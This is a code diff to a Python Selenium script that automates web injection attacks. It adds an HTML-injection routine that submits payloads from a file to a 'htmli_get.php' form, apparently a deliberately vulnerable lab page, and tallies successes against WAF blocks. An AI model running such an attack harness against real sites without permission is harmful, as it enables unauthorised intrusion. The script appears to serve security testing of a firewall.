@@ -4,7 +4,8 @@ from selenium.common.exceptions import NoSuchElementException
 
 def execute(driver, target_url):
     # Start to attack
-    os_injection_attack(driver, target_url)
+    #os_injection_attack(driver, target_url)
+    html_injection_attack(driver, target_url)
 
 
 def os_injection_attack(driver, target_url):
@@ -38,6 +39,47 @@ def os_injection_attack(driver, target_url):
                     pass
 
         print(f"\n[!] ~~~OS Injection Results~~~ [!]")
+        print(f"[+] Total Successful Attacks:", success_counter)
+        print(f"[+] Total Blocked By WAF:", blocked_by_waf_counter)
+        print(f"[+] Total Failed Attacks:", length_of_payload_file - blocked_by_waf_counter - success_counter)
+
+
+def html_injection_attack(driver, target_url):
+    print(f"[+] Running HTML Injection Attacks")
+    attack_url_page = "htmli_get.php"  # HTML Injection - Reflected (GET)
+    success_counter = 0
+    blocked_by_waf_counter = 0
+    length_of_payload_file = 0
+
+    with open("Payloads/HTML_Injection.txt", 'r', encoding='latin-1') as payload_list:
+        for payload in payload_list.read().splitlines():
+            length_of_payload_file += 1
+            try:
+                # Load page
+                driver.get(target_url + attack_url_page)
+                #driver.find_element_by_name("security_level").click()
+                #driver.find_element_by_xpath("//select[@name='security_level']/option[@value='1']").click()
+                #driver.find_element_by_name("form_security_level").click()
+
+
+                # Send payload
+                driver.find_element_by_id("firstname").clear()
+                driver.find_element_by_id("lastname").clear()
+                driver.find_element_by_id("firstname").send_keys("a")
+                driver.find_element_by_id("lastname").send_keys(payload, Keys.RETURN)
+                # Look for success
+                att = driver.find_element_by_id("hacker")
+                success_counter += 1
+            except NoSuchElementException:
+                try:
+                    # Catch WAF Blocking page
+                    waf_block_message = driver.find_element_by_xpath("/html/body/center/h1").text
+                    if "403 Forbidden" == waf_block_message:
+                        blocked_by_waf_counter +=1
+                except NoSuchElementException:
+                    pass
+
+        print(f"\n[!] ~~~HTML Injection Results~~~ [!]")
         print(f"[+] Total Successful Attacks:", success_counter)
         print(f"[+] Total Blocked By WAF:", blocked_by_waf_counter)
         print(f"[+] Total Failed Attacks:", length_of_payload_file - blocked_by_waf_counter - success_counter)
